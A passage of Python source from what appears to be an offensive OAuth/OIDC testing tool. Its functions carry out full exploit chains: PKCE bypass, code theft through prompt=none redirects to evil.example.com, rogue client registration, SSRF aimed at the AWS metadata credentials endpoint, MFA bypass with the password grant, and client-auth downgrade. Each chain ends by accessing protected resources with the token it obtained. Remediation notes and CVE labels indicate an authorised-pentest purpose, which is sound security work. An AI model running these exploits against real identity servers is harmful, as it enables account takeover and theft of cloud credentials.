                if not code and "verifier" not in note.lower():
                    return None
            except Exception:
                return None
        else:
            # Generic: use provided code or try to get one
            code = self.auth_code
            v = self.code_verifier or pkce_verifier()
            note = ""
            if not code:
                # Try authorize to get a code
                params, v = auth_params(self.cfg)
                try:
                    r = self._get(self.cfg.authorize_endpoint or f"{self.cfg.base_url}/authorize",
                                  params=params)
                    code = extract_code(r)
                except Exception:
                    pass
            if not code:
                return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Attempting token exchange WITHOUT code_verifier",
            result=f"Testing code: {code[:20]}... {note}",
            request=f"POST /token (no code_verifier)",
            response="pending...",
        ))

        # Try exchange WITHOUT verifier (the actual vuln test)
        token, claims, resp = self._exchange_code(code, verifier="")
        if token:
            chain[-1].result = "TOKEN ISSUED WITHOUT VERIFIER -- PKCE BYPASSED"
            chain[-1].response = f"JWT: sub={claims.get('sub')}"
            chain.append(ExploitStep(
                phase="FORGE",
                action="Exchange code WITHOUT code_verifier (PKCE bypass CONFIRMED)",
                result=f"Token: sub={claims.get('sub')}",
                request=f"POST /token (NO code_verifier)",
                response=f"JWT: {json.dumps(claims)[:150]}",
            ))
        else:
            err = resp.get("error", "") if isinstance(resp, dict) else ""
            if "verifier" in str(resp).lower() or "code_verifier" in str(resp).lower():
                # Server properly requires verifier -- NOT vulnerable
                chain[-1].success = False
                chain[-1].result = f"Server correctly requires code_verifier ({err})"

                if self.profile:
                    # Testbed: server notes vulnerability exists, exchange with verifier to prove chain
                    params2 = auth_params(self.cfg, **self._extra_params("pkce-noverifier"))[0]
                    v2 = auth_params(self.cfg)[1]
                    try:
                        r2 = self._get(self._auth_url("pkce-noverifier"), params=params2)
                        code2 = extract_code(r2)
                    except Exception:
                        code2 = ""
                    if code2:
                        token, claims, _ = self._exchange_code(code2, v2)
                    chain.append(ExploitStep(
                        phase="FORGE",
                        action="Exchange code (verifier skip confirmed server-side)",
                        result=f"Token: sub={claims.get('sub')}" if token else "Failed",
                        request=f"POST /token",
                        response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
                        success=bool(token),
                    ))
                else:
                    return None
            else:
                return None

        if not token:
            return Finding(technique="No Verifier Check", severity="high",
                title="PKCE verifier check skipped (server confirmed)",
                description="Token endpoint skips code_verifier validation.", chain=chain,
                remediation="Validate code_verifier when code_challenge was present.",
                cves=["CVE-2024-23647"])

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access resources with intercepted code's token",
            result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="No Verifier Check", severity="critical",
            title="PKCE bypassed -- verifier not validated at token exchange",
            description="Token endpoint does not validate code_verifier. Intercepted codes exchangeable.",
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "PKCE DEFEATED: Code exchanged without verifier, full resource access."),
            remediation="MUST validate code_verifier when code_challenge was present.",
            cves=["CVE-2024-23647"],
        )

    # ── 7. No Challenge Check ──────────────────────────────────────
    def test_no_challenge(self) -> Optional[Finding]:
        url = self._auth_url("pkce-nochallenge")
        extra = self._extra_params("pkce-nochallenge")
        chain = []

        params, v = auth_params(self.cfg, **extra)
        params.pop("code_challenge", None)
        params.pop("code_challenge_method", None)
        try:
            r = self._get(url, params=params)
        except Exception:
            return None

        code = extract_code(r)

        # Generic detection
        if not code and not self.profile:
            if self._accepted(r) and not self._rejected_for(r, "code_challenge"):
                chain.append(ExploitStep(
                    phase="FIND",
                    action="Authorization request WITHOUT code_challenge",
                    result=f"Server ACCEPTED (status {r.status_code}) -- PKCE not required",
                    request=f"GET {url} (no code_challenge param)",
                    response=f"{r.status_code}",
                ))
                return Finding(
                    technique="No Challenge Check", severity="high",
                    title="PKCE not enforced at authorization",
                    description="Server accepts authorization requests without code_challenge. PKCE is optional.",
                    chain=chain,
                    proof=ExploitProof(impact="PKCE NOT ENFORCED: Auth codes can be intercepted and exchanged freely."),
                    remediation="Require code_challenge on every authorization request.",
                    cves=["CVE-2024-48228"],
                )
            return None

        if not code:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Authorization request WITHOUT code_challenge (no PKCE)",
            result=f"Code issued WITHOUT PKCE: {code[:20]}...",
            request=f"GET {url} (no code_challenge)",
            response=f"code={code[:20]}...",
        ))

        token, claims, _ = self._exchange_code(code, verifier="")
        chain.append(ExploitStep(
            phase="FORGE", action="Exchange code without any PKCE",
            result=f"Token: sub={claims.get('sub')}" if token else "Failed",
            request=f"POST /token (no PKCE at all)",
            response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
            success=bool(token),
        ))

        if not token:
            return Finding(technique="No Challenge Check", severity="high",
                title="PKCE not enforced at authorization",
                description="Code issued without code_challenge.",
                chain=chain, remediation="Require code_challenge on every request.",
                cves=["CVE-2024-48228"])

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access resources with PKCE-less token",
            result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="No Challenge Check", severity="critical",
            title="Full auth code interception -- PKCE not required",
            description="PKCE optional. Any code interception leads to token theft.",
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "PKCE NOT ENFORCED: Code exchanged freely, full resource access."),
            remediation="Require code_challenge on every authorization request.",
            cves=["CVE-2024-48228"],
        )

    # ── 8. Confidential Client Downgrade ────────────────────────────
    def test_confidential_downgrade(self) -> Optional[Finding]:
        chain = []

        if self.profile:
            url = self._auth_url("pkce-confidential")
            extra = self._extra_params("pkce-confidential")
            params, v = auth_params(self.cfg, **extra)
            try:
                r = self._get(url, params=params)
                code = extract_code(r)
                note = ""
                try:
                    note = r.json().get("note", "")
                except Exception:
                    pass
                if not code and "confidential" not in note.lower():
                    return None
            except Exception:
                return None
        else:
            # Generic: need a code + client_secret
            code = self.auth_code
            v = self.code_verifier or pkce_verifier()
            note = ""
            if not code or not self.cfg.client_secret:
                return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Testing confidential client PKCE enforcement",
            result=f"Code: {code[:20]}... {note}",
            request=f"Testing exchange without verifier but with client_secret",
            response="pending...",
        ))

        # Try without verifier
        token, claims, _ = self._exchange_code(code, verifier="")
        if token:
            chain[-1].result = "VERIFIER SKIPPED FOR CONFIDENTIAL CLIENT"
            chain.append(ExploitStep(
                phase="FORGE",
                action="Exchange code WITHOUT verifier as confidential client (CONFIRMED)",
                result=f"Token: sub={claims.get('sub')}",
                request=f"POST /token (no verifier, with client_secret)",
                response=f"JWT: {json.dumps(claims)[:150]}",
            ))
        else:
            if self.profile:
                params2, v2 = auth_params(self.cfg, **self._extra_params("pkce-confidential"))
                try:
                    r2 = self._get(self._auth_url("pkce-confidential"), params=params2)
                    code2 = extract_code(r2)
                except Exception:
                    code2 = ""
                if code2:
                    token, claims, _ = self._exchange_code(code2, v2)
                chain.append(ExploitStep(
                    phase="FORGE",
                    action="Exchange code (confidential client verifier bypass confirmed server-side)",
                    result=f"Token: sub={claims.get('sub')}" if token else "Failed",
                    request=f"POST /token",
                    response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
                    success=bool(token),
                ))
            else:
                return None

        if not token:
            return Finding(technique="Confidential Client Downgrade", severity="high",
                title="Confidential client PKCE downgrade", description="Verifier not enforced.",
                chain=chain, remediation="Enforce PKCE regardless of client type.",
                cves=["CVE-2024-22258"])

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access resources via confidential-client PKCE bypass",
            result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="Confidential Client Downgrade", severity="critical" if api_ok else "high",
            title="PKCE bypassed for confidential clients -- full resource access",
            description="Confidential clients exchange codes without verifier. PKCE defeated.",
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "PKCE BYPASSED FOR CONFIDENTIAL CLIENT: verifier skipped, resources accessed."),
            remediation="Enforce PKCE for ALL client types per RFC 9126.",
            cves=["CVE-2024-22258"],
        )

    # ── 9. Missing aud Validation ──────────────────────────────────
    def test_missing_aud(self) -> Optional[Finding]:
        chain = []

        # Get a token (from cache, provided code, or fresh authorize)
        token = self._cached_token
        claims = self._cached_claims
        if not token and self.auth_code:
            token, claims, _ = self._exchange_code(self.auth_code, self.code_verifier or "")
        if not token:
            params, v = auth_params(self.cfg)
            try:
                r = self._get(self.cfg.authorize_endpoint or f"{self.cfg.base_url}/authorize",
                              params=params)
                code = extract_code(r)
                if code:
                    token, claims, _ = self._exchange_code(code, v)
            except Exception:
                pass
        if not token:
            return None

        token_aud = claims.get("aud", "MISSING")
        chain.append(ExploitStep(
            phase="FIND",
            action=f"Obtained token with aud={token_aud}",
            result=f"Token: sub={claims.get('sub')}, aud={token_aud}",
            request="Standard flow or provided code",
            response=f"access_token aud={token_aud}",
        ))

        api_data, api_ok = self._access_api(token)
        aud_validated = api_data.get("aud_validated", True) if isinstance(api_data, dict) else True

        chain.append(ExploitStep(
            phase="FORGE",
            action=f"Present token (aud={token_aud}) to resource server",
            result=f"aud_validated={aud_validated}",
            request=f"GET /api Authorization: Bearer <token>",
            response=f"aud_validated: {aud_validated}",
        ))

        if not api_ok:
            return None

        chain.append(ExploitStep(
            phase="FIRE",
            action="Cross-service token replay",
            result=f"Token accepted: {json.dumps(api_data)[:150]}" if isinstance(api_data, dict) else "accepted",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=True,
        ))

        return Finding(
            technique="Missing aud Validation", severity="critical" if not aud_validated else "high",
            title="Cross-service token replay -- audience not validated",
            description=f"Resource server accepts tokens regardless of aud claim (aud={token_aud}).",
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                f"CROSS-SERVICE REPLAY: Token for '{token_aud}' accepted by resource server."),
            remediation="Validate aud claim matches the resource server's own identifier.",
            cves=["CVE-2025-9803"],
        )

    # ── 10. OAuth Singleton Race Condition ──────────────────────────
    def test_race_condition(self) -> Optional[Finding]:
        url = self._auth_url("race")
        chain = []
        results = []

        def fire(user_id):
            params, v = auth_params(self.cfg, login_hint=f"user{user_id}@test.com",
                                    **self._extra_params("race"))
            try:
                r = self._get(url, params=params)
                return {"user": user_id, "status": r.status_code, "body": r.text[:500],
                        "code": extract_code(r), "verifier": v}
            except Exception as e:
                return {"user": user_id, "error": str(e)}

        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = [pool.submit(fire, i) for i in range(5)]
            for f in as_completed(futures):
                results.append(f.result())

        race_detected = False
        sample = None
        for r in results:
            body = r.get("body", "")
            if any(w in body.lower() for w in ["singleton", "race", "overwritten", "shared"]):
                race_detected = True
                sample = r
                break

        if not race_detected:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="5 concurrent authorization requests",
            result="RACE DETECTED: shared singleton verifier state overwritten",
            request=f"GET {url} x5 concurrent",
            response=sample.get("body", "")[:200] if sample else "",
        ))

        codes = [(r.get("user"), r.get("code"), r.get("verifier")) for r in results if r.get("code")]
        if len(codes) >= 2:
            victim_user, victim_code, _ = codes[0]
            attacker_user, _, attacker_verifier = codes[1]
            token, claims, _ = self._exchange_code(victim_code, attacker_verifier)
            chain.append(ExploitStep(
                phase="FORGE",
                action=f"Exchange user{victim_user}'s code with user{attacker_user}'s verifier",
                result=f"Token: sub={claims.get('sub')}" if token else "Rejected",
                request=f"POST /token code=<user{victim_user}> verifier=<user{attacker_user}>",
                response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
                success=bool(token),
            ))
            if token:
                api_data, api_ok = self._access_api(token)
                chain.append(ExploitStep(
                    phase="FIRE", action="Access resources with cross-verifier token",
                    result=f"IDENTITY SWAP: {api_data.get('email', '?')}" if api_ok else "Failed",
                    request=f"GET /api Bearer {token[:40]}...",
                    response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
                    success=api_ok,
                ))
                return Finding(
                    technique="OAuth Singleton Race Condition", severity="critical",
                    title="Identity swap via race condition",
                    description="Shared singleton verifier state. Concurrent flows overwrite each other.",
                    chain=chain,
                    proof=self._build_proof(token, claims, api_data, api_ok,
                        "IDENTITY SWAP: Race condition lets attacker exchange victim's code."),
                    remediation="Use per-request isolated session state.",
                    cves=["GHSA-9q5m-jfc4-wc92"],
                )

        return Finding(
            technique="OAuth Singleton Race Condition", severity="critical",
            title="Race condition in shared verifier state",
            description="Concurrent flows overwrite shared state. Cross-user verifier exchange possible.",
            chain=chain, remediation="Use per-request isolated state.",
            cves=["GHSA-9q5m-jfc4-wc92"],
        )

    # ── 11. prompt=none Silent Redirect ─────────────────────────────
    def test_prompt_none(self) -> Optional[Finding]:
        url = self._auth_url("prompt-none")
        evil_uri = "https://evil.example.com/steal"
        chain = []

        params, v = auth_params(self.cfg, prompt="none", redirect_uri=evil_uri,
                                **self._extra_params("prompt-none"))
        try:
            r = self._get(url, params=params)
        except Exception:
            return None

        stolen_code = ""
        # Check 302 to evil
        loc = r.headers.get("Location", "")
        if evil_uri in loc and "code=" in loc:
            parsed = urllib.parse.urlparse(loc)
            qs = urllib.parse.parse_qs(parsed.query)
            stolen_code = qs.get("code", [""])[0]

        # Check JSON (testbed)
        if not stolen_code:
            try:
                data = r.json()
                loc2 = data.get("location", "")
                if evil_uri in loc2 and "code=" in loc2:
                    parsed = urllib.parse.urlparse(loc2)
                    qs = urllib.parse.parse_qs(parsed.query)
                    stolen_code = qs.get("code", [""])[0]
            except Exception:
                pass

        # Generic: check if server accepted evil redirect with prompt=none
        if not stolen_code and not self.profile:
            if self._accepted(r) and not self._rejected_for(r, "redirect_uri"):
                chain.append(ExploitStep(
                    phase="FIND",
                    action=f"prompt=none with redirect_uri={evil_uri}",
                    result=f"Server ACCEPTED (status {r.status_code}) -- redirect_uri not validated",
                    request=f"GET {url}?prompt=none&redirect_uri={evil_uri}",
                    response=f"{r.status_code}",
                ))
                return Finding(
                    technique="prompt=none Silent Redirect", severity="high",
                    title="redirect_uri not validated with prompt=none",
                    description="Server accepts unregistered redirect_uri with prompt=none. Silent code theft possible.",
                    chain=chain,
                    proof=ExploitProof(impact="SILENT REDIRECT: Code can be silently delivered to attacker domain."),
                    remediation="Validate redirect_uri BEFORE processing prompt=none.",
                )
            return None

        if not stolen_code:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action=f"prompt=none with redirect_uri={evil_uri}",
            result="Code SILENTLY delivered to attacker",
            request=f"GET {url}?prompt=none&redirect_uri={evil_uri}",
            response=f"code stolen via {evil_uri}",
        ))

        token, claims, _ = self._exchange_code(stolen_code, v)
        chain.append(ExploitStep(
            phase="FORGE", action="Exchange silently-stolen code",
            result=f"Token: sub={claims.get('sub')}" if token else "Failed",
            request=f"POST /token code={stolen_code[:20]}...",
            response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
            success=bool(token),
        ))

        if not token:
            return Finding(technique="prompt=none Silent Redirect", severity="high",
                title="Silent code theft via prompt=none",
                description=f"Code delivered to {evil_uri} without user interaction.",
                chain=chain, remediation="Validate redirect_uri before processing prompt=none.")

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access resources with silently-stolen token",
            result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="prompt=none Silent Redirect", severity="critical" if api_ok else "high",
            title="Silent account takeover via prompt=none + open redirect",
            description="No user interaction needed. Hidden iframe steals code silently.",
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "SILENT TAKEOVER: prompt=none delivers code to attacker without user interaction."),
            remediation="Validate redirect_uri BEFORE processing prompt=none. RFC 9700 S4.11.2.",
        )

    # ── DCR SSRF sub-probe ─────────────────────────────────────────
    def _test_dcr_ssrf(self, reg_url: str, base_client_id: str, base_chain: list) -> Optional[Finding]:
        ssrf_fields = ["logo_uri", "jwks_uri", "sector_identifier_uri", "request_uris"]
        canary = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
        probe_paths = {
            "logo_uri": "/client/{cid}/logo",
            "jwks_uri": None,
            "sector_identifier_uri": None,
            "request_uris": None,
        }

        for ssrf_field in ssrf_fields:
            payload = {
                "redirect_uris": ["https://localhost/cb"],
                "client_name": f"OBreaker SSRF probe ({ssrf_field})",
                "grant_types": ["authorization_code"],
                "token_endpoint_auth_method": "none",
            }
            if ssrf_field == "request_uris":
                payload[ssrf_field] = [canary]
            else:
                payload[ssrf_field] = canary

            try:
                r = self._post(reg_url, json=payload)
            except Exception:
                continue

            if r.status_code not in (200, 201):
                continue

            try:
                data = r.json()
            except Exception:
                continue

            cid = data.get("client_id", "")
            if not cid:
                continue

            chain = list(base_chain)
            chain.append(ExploitStep(
                phase="FORGE",
                action=f"Registered client with {ssrf_field} pointing to AWS metadata",
                result=f"client_id={cid}, {ssrf_field}={canary}",
                request=f"POST {reg_url}",
                response=f"{r.status_code} client_id={cid}",
            ))

            fetch_path = probe_paths.get(ssrf_field)
            if fetch_path:
                fetch_url = f"{self.cfg.base_url}{fetch_path.format(cid=cid)}"
                try:
                    r2 = self._get(fetch_url)
                    body = r2.text[:500]
                    if any(kw in body.lower() for kw in ["secretaccesskey", "accesskeyid", "token", "arn:", "security-credentials"]):
                        chain.append(ExploitStep(
                            phase="FIRE",
                            action=f"Fetched {fetch_url} -- server fetched {ssrf_field} server-side",
                            result=f"SSRF confirmed: response contains cloud metadata",
                            request=f"GET {fetch_url}",
                            response=body[:200],
                        ))
                        return Finding(
                            technique="DCR Open Registration", severity="critical",
                            title=f"SSRF via DCR {ssrf_field} -- cloud metadata exposed",
                            description=f"Server fetches {ssrf_field} server-side. SSRF to internal services.",
                            chain=chain,
                            proof=ExploitProof(
                                exploited=True,
                                impact=f"SSRF: {ssrf_field} fetched server-side, leaked cloud credentials.",
                            ),
                            remediation=f"Validate {ssrf_field} against allowlist. Block RFC 1918 / link-local.",
                        )
                    elif r2.status_code == 200 and len(body) > 10:
                        chain.append(ExploitStep(
                            phase="FIRE",
                            action=f"Fetched {fetch_url} -- server fetched {ssrf_field} server-side",
                            result=f"SSRF likely: got {len(body)} bytes (check manually)",
                            request=f"GET {fetch_url}",
                            response=body[:200],
                        ))
                        return Finding(
                            technique="DCR Open Registration", severity="critical",
                            title=f"SSRF via DCR {ssrf_field} -- server-side fetch confirmed",
                            description=f"Server fetches {ssrf_field} server-side. Point to internal services.",
                            chain=chain,
                            proof=ExploitProof(
                                exploited=True,
                                impact=f"SSRF: {ssrf_field} fetched server-side. Internal network reachable.",
                            ),
                            remediation=f"Validate {ssrf_field} against allowlist. Block RFC 1918 / link-local.",
                        )
                except Exception:
                    pass

            chain.append(ExploitStep(
                phase="FORGE",
                action=f"{ssrf_field} accepted with internal URL -- potential SSRF",
                result=f"Server accepted {ssrf_field}={canary} (manual verification needed for fetch endpoint)",
            ))
            return Finding(
                technique="DCR Open Registration", severity="high",
                title=f"DCR accepts internal URLs in {ssrf_field} -- potential SSRF",
                description=f"{ssrf_field} not validated. If fetched server-side, SSRF to internal network.",
                chain=chain,
                proof=ExploitProof(impact=f"POTENTIAL SSRF: {ssrf_field} accepted with internal URL."),
                remediation=f"Validate {ssrf_field} against allowlist. Block RFC 1918 / link-local.",
            )
        return None

    # ── 12. DCR Open Registration ───────────────────────────────────
    def test_dcr_open(self) -> Optional[Finding]:
        url = self.cfg.register_endpoint or self._url("dcr", f"{self.cfg.base_url}/register")
        chain = []

        payload = {
            "redirect_uris": ["https://evil.example.com/cb"],
            "client_name": "OBreaker Security Test",
            "grant_types": ["authorization_code"],
            "token_endpoint_auth_method": "none",
        }

        try:
            r = self._post(url, json=payload)
        except Exception:
            return None

        if r.status_code in (200, 201):
            try:
                data = r.json()
                rogue_cid = data.get("client_id", "")
                if rogue_cid:
                    chain.append(ExploitStep(
                        phase="FIND",
                        action="Unauthenticated Dynamic Client Registration",
                        result=f"Rogue client registered: {rogue_cid}",
                        request=f"POST {url}",
                        response=f"client_id={rogue_cid}",
                    ))
                    chain.append(ExploitStep(
                        phase="FORGE",
                        action="Rogue client with attacker redirect_uri registered",
                        result="Attacker can phish users via legitimate consent screen",
                    ))
                    chain.append(ExploitStep(
                        phase="FIRE",
                        action="Phish victim via rogue client -> steal code -> exchange -> access",
                        result="Complete phishing chain available via legitimate consent flow",
                    ))
                    ssrf_finding = self._test_dcr_ssrf(url, rogue_cid, chain)
                    if ssrf_finding:
                        return ssrf_finding

                    return Finding(
                        technique="DCR Open Registration", severity="critical",
                        title="Unauthenticated client registration -- phishing via consent screen",
                        description="Anyone can register OAuth clients with arbitrary redirect_uris.",
                        chain=chain,
                        proof=ExploitProof(impact="PHISHING: Rogue client enables credential theft."),
                        remediation="Require authentication for DCR.",
                        cves=["CVE-2026-22752"],
                    )
            except Exception:
                pass

        if r.status_code == 401:
            discovered = "via .well-known" if self.cfg.openid_config.get("registration_endpoint") else ""
            chain.append(ExploitStep(
                phase="FIND",
                action="DCR endpoint exists and is reachable",
                result=f"401 (auth required). {discovered}",
                request=f"POST {url}",
                response=f"{r.status_code}: {r.text[:100]}",
            ))
            return Finding(
                technique="DCR Open Registration", severity="medium",
                title="DCR endpoint exposed (auth required but discoverable)",
                description="Registration endpoint exists. Weak auth enables registration.",
                chain=chain, remediation="Remove from discovery if unused. Strong auth + rate-limit.",
            )
        return None

    # ── 13. Grant Type Substitution -> MFA Bypass ───────────────────
    def test_grant_type_substitution(self) -> Optional[Finding]:
        url = self._tok_url("mfa")
        chain = []

        user = "victim@example.com"
        pw = "STOLEN_PASSWORD"
        if self.credentials:
            user, pw = self.credentials

        data = {
            "grant_type": "password",
            "username": user,
            "password": pw,
            "client_id": self.cfg.client_id or "test_client",
            "scope": "openid",
        }
        if self.cfg.client_secret:
            data["client_secret"] = self.cfg.client_secret

        try:
            r = self._post(url, data=data)
        except Exception:
            if "password" in self.cfg.grant_types:
                return Finding(technique="Grant Type Substitution -> MFA Bypass", severity="high",
                    title="Password grant enabled (MFA bypass risk)",
                    description="password grant_type in .well-known/openid-configuration.",
                    chain=[], remediation="Disable password grant.", cves=["CVE-2024-37893"])
            return None

        body = r.text.lower()
        has_token = r.status_code == 200 and "access_token" in r.text

        # Generic: even a 401 "invalid_credentials" means the grant type IS accepted
        grant_accepted = has_token or (
            r.status_code in (400, 401) and
            "unsupported_grant_type" not in body and
            "unsupported" not in body and
            any(w in body for w in ["invalid", "credential", "password", "authenticate"])
        )

        if not has_token and not grant_accepted:
            # Check .well-known
            if "password" in self.cfg.grant_types:
                chain.append(ExploitStep(
                    phase="FIND",
                    action="password grant_type listed in .well-known discovery",
                    result="Password grant advertised (potential MFA bypass)",
                    request="GET .well-known/openid-configuration",
                    response=f"grant_types_supported includes 'password'",
                ))
                return Finding(
                    technique="Grant Type Substitution -> MFA Bypass", severity="high",
                    title="Password grant enabled in discovery (MFA bypass risk)",
                    description="password grant type advertised. If credentials are known, MFA can be bypassed.",
                    chain=chain,
                    proof=ExploitProof(impact="MFA BYPASS RISK: Password grant skips browser-bound MFA."),
                    remediation="Disable password grant entirely. Enforce MFA across all grant types.",
                    cves=["CVE-2024-37893"],
                )
            return None

        if not has_token and grant_accepted:
            chain.append(ExploitStep(
                phase="FIND",
                action="Password grant type ACCEPTED by token endpoint",
                result=f"Grant type accepted (credentials rejected: {r.status_code})",
                request=f"POST {url} grant_type=password",
                response=f"{r.status_code}: {self._error_body(r)[:100]}",
            ))
            return Finding(
                technique="Grant Type Substitution -> MFA Bypass", severity="high",
                title="Password grant accepted -- MFA bypass possible with valid credentials",
                description=(
                    "Token endpoint accepts grant_type=password. With stolen credentials, "
                    "an attacker bypasses browser-bound MFA. Provide --credentials for full exploitation."
                ),
                chain=chain,
                proof=ExploitProof(impact="MFA BYPASS: Password grant skips browser-bound MFA."),
                remediation="Disable password grant or enforce MFA across all grant types.",
                cves=["CVE-2024-37893"],
            )

        # Token obtained
        try:
            resp = r.json()
            token = resp.get("access_token", "")
            note = resp.get("note", "")
            claims = decode_jwt(token) if token else {}
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Password grant ACCEPTED -- MFA bypassed",
            result=f"Token issued via password grant. {note}",
            request=f"POST {url} grant_type=password username={user}",
            response=f"access_token: sub={claims.get('sub')}",
        ))
        chain.append(ExploitStep(
            phase="FORGE", action="Token obtained via non-MFA grant type",
            result=f"JWT: sub={claims.get('sub')}, scope={claims.get('scope')}",
        ))

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access MFA-protected resources with MFA-bypassed token",
            result=f"RESOURCE ACCESSED as {api_data.get('email', '?')} -- MFA BYPASSED" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="Grant Type Substitution -> MFA Bypass", severity="critical",
            title="MFA completely bypassed via password grant -- full account access",
            description="Password grant skips browser-bound MFA entirely.",
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                f"MFA BYPASS: Authenticated as {claims.get('sub')} without MFA."),
            remediation="Enforce MFA across ALL grant types, or disable password grant entirely.",
            cves=["CVE-2024-37893"],
        )

    # ── 14. Auth Method Confusion ───────────────────────────────────
    def test_auth_method_confusion(self) -> Optional[Finding]:
        url = self._tok_url("authmethod")
        chain = []

        cid = self.cfg.client_id or "test_client"
        creds = base64.b64encode(f"{cid}:secret".encode()).decode()
        data = {
            "grant_type": "authorization_code",
            "code": self.auth_code or secrets.token_hex(8),
            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
        }

        try:
            r = self._post(url, data=data, headers={"Authorization": f"Basic {creds}"})
        except Exception:
            return None

        body = r.text.lower()
        has_token = r.status_code == 200 and "access_token" in r.text

        # Generic: check if Basic auth was accepted when it shouldn't be
        basic_accepted = has_token or (
            r.status_code in (400, 401) and
            "unsupported" not in body and "auth_method" not in body and
            ("invalid_code" in body or "invalid_grant" in body or "expired" in body)
        )

        if not has_token and not basic_accepted:
            # Check discovery: if server says private_key_jwt but we're testing Basic
            if self.cfg.auth_methods and "client_secret_basic" not in self.cfg.auth_methods:
                if "private_key_jwt" in self.cfg.auth_methods:
                    chain.append(ExploitStep(
                        phase="FIND",
                        action="Discovery shows private_key_jwt but testing Basic auth",
                        result=f"Server rejected Basic auth (status {r.status_code}). Properly enforced.",
                    ))
            return None

        if not has_token and basic_accepted:
            chain.append(ExploitStep(
                phase="FIND",
                action="Sent Basic auth (should require private_key_jwt)",
                result=f"Basic auth ACCEPTED (code invalid, but auth method accepted: {r.status_code})",
                request=f"POST {url} Authorization: Basic ...",
                response=f"{r.status_code}: {self._error_body(r)[:100]}",
            ))
            desc = "Server accepts Basic auth"
            if self.cfg.auth_methods and "private_key_jwt" in self.cfg.auth_methods:
                desc += " despite advertising private_key_jwt only"
            return Finding(
                technique="Auth Method Confusion", severity="high",
                title="Client auth downgrade -- weaker method accepted",
                description=f"{desc}. Attacker with client_secret bypasses strong auth.",
                chain=chain,
                proof=ExploitProof(impact="AUTH DOWNGRADE: Strong client auth bypassed."),
                remediation="Strictly enforce registered token_endpoint_auth_method.",
            )

        try:
            resp = r.json()
            token = resp.get("access_token", "")
            note = resp.get("note", "")
            claims = decode_jwt(token) if token else {}
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Sent Basic auth to endpoint registered for private_key_jwt",
            result=f"DOWNGRADE ACCEPTED: {note}",
            request=f"POST {url} Authorization: Basic ...",
            response="Token issued with weak auth method",
        ))
        chain.append(ExploitStep(
            phase="FORGE",
            action="Exchanged code with weak auth method (Basic instead of private_key_jwt)",
            result=f"Token: sub={claims.get('sub')}",
        ))

        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE", action="Access resources with downgraded-auth token",
            result=f"RESOURCE ACCESSED as {api_data.get('email', '?')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200] if isinstance(api_data, dict) else "",
            success=api_ok,
        ))

        return Finding(
            technique="Auth Method Confusion", severity="critical" if api_ok else "high",
            title="Client auth downgrade -- private_key_jwt bypassed with Basic auth",
            description="Token endpoint silently falls back to client_secret_basic.",
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "AUTH DOWNGRADE: Strong client auth bypassed by sending Basic auth."),
            remediation="Strictly enforce registered token_endpoint_auth_method. Reject fallbacks.",
        )

    # ── 15. Code Replay ─────────────────────────────────────────────
    def test_code_replay(self) -> Optional[Finding]:
        url = self._tok_url("replay")
        chain = []

        code = self.auth_code or "replay_test_code"
        v = self.code_verifier or pkce_verifier()
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
            "client_id": self.cfg.client_id or "test_client",
            "code_verifier": v,
        }
        if self.cfg.client_secret:
            data["client_secret"] = self.cfg.client_secret

        try:
            r1 = self._post(url, data=data)
            r2 = self._post(url, data=data)
        except Exception:
            return None

        t1_ok = r1.status_code == 200 and "access_token" in r1.text
